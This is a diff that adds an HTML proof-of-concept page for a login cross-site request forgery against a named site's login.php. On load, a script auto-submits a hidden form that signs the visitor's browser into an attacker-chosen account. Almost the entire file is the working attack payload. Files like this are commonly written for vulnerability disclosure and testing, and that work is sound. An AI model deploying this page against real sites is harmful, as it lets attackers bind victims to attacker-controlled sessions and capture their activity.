@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head><title>VQC Login CSRF PoC</title></head>
+<body>
+<h3>Login CSRF — Proof of Concept</h3>
+<p>This page auto-submits a cross-origin POST to vqc.ftr.com/login.php with attacker-chosen credentials.</p>
+<form id="csrf" action="https://vqc.ftr.com/login.php?originating_page=http%3A%2F%2Fvqc.ftr.com%2Fquality.php" method="POST">
+  <input type="hidden" name="username" value="attacker_corp_id" />
+  <input type="hidden" name="password" value="attacker_password" />
+  <input type="hidden" name="submit" value="Submit" />
+</form>
+<script>document.getElementById('csrf').submit();</script>
+</body>
+</html>
